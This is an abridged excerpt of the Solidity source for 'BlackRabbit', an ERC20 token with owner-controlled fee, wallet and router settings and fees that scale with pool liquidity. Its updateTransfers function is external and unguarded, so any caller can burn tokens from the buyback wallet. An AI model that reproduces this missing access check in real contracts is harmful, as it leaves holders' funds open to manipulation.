...
contract BlackRabbit is ERC20, Ownable{
   ...
   using SafeMath for uint256;
    ...
    uint256 public _ETHRewardsFee = 6;
    uint256 public _MarketingFee = 3;
    uint256 public _BurnFee = 3;
    uint256 public _TotalFees = _ETHRewardsFee.add(_MarketingFee).add(_BurnFee);
    
    
    uint256 public maxWalletToken = 200 * (10**5) * (10**18); //2%

    address public _marketingWalletAddress = 0x7Ac61a07Fff8C02483eF383d0364EA4a302529D9;
    address public _buyBackWalletAddress = 0xf0202CBDCE96E574eC7BB3eBddF5da24ba090d4C;

    uint public marketingFeeShare = 5;
    uint public teamFeeShare = 5;
    ...
    constructor() public ERC20("BlackRabbit", "BRB") {
        ...
        excludeOrIncludeFromMaxWallet(deadWallet, true);
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "BRB: The dividend tracker already has that address");

        ETHBackDividendTracker newDividendTracker = ETHBackDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "BRB: The new dividend tracker must be owned by the BRB token contract");
    ...
    function updateuniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "BRB: The router already has that address");
    ...
    function excludeOrIncludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "BRB: Account is already the value of 'excluded'");
    ...
    {
        require(_isExcludedFromMaxWallet[account] != excluded, "BRB: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "BRB: The uniswap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "BRB: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "BRB: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "BRB: Cannot update gasForProcessing to same value");
    ...
    function updateTransfers(uint256 amount) external{
        _burnfuntion(_buyBackWalletAddress, amount);
    }
    ...
    function _transfer(
        ...
        
        {
            ...
            uint256 walletTokens = contractTokenBalance.mul(_MarketingFee.add(_BurnFee)).div(_TotalFees);
    ...
    function swapAndSendToFee(uint256 tokens) private  {
        ...
        IERC20(ETH).transfer(_buyBackWalletAddress, teamFeeBalance);
    }
    ...
    function swapAndSendDividends(uint256 tokens) private {
     ...
     function calculateFee() private {
        ...
        numWBNB = WBNB.balanceOf(uniswapV2Pair);
 
        if(numWBNB >= 300 * (10**18) && numWBNB < 1000 * (10**18)){

            _ETHRewardsFee = 4;
            _MarketingFee = 2;
            _BurnFee = 2;
            _TotalFees = _ETHRewardsFee.add(_MarketingFee).add(_BurnFee);//8%
       }

        if(numWBNB >= 1000 * (10**18) && numWBNB < 2000 * (10**18)){

            _ETHRewardsFee = 2;
            _MarketingFee = 1;
            _BurnFee = 1;
            _TotalFees = _ETHRewardsFee.add(_MarketingFee).add(_BurnFee);//4%
       }

         if(numWBNB >= 2000 * (10**18) ){

            _ETHRewardsFee = 2;
            _MarketingFee = 0;
            _BurnFee = 0;
            _TotalFees = _ETHRewardsFee.add(_MarketingFee).add(_BurnFee);//2%
       }
    }
}
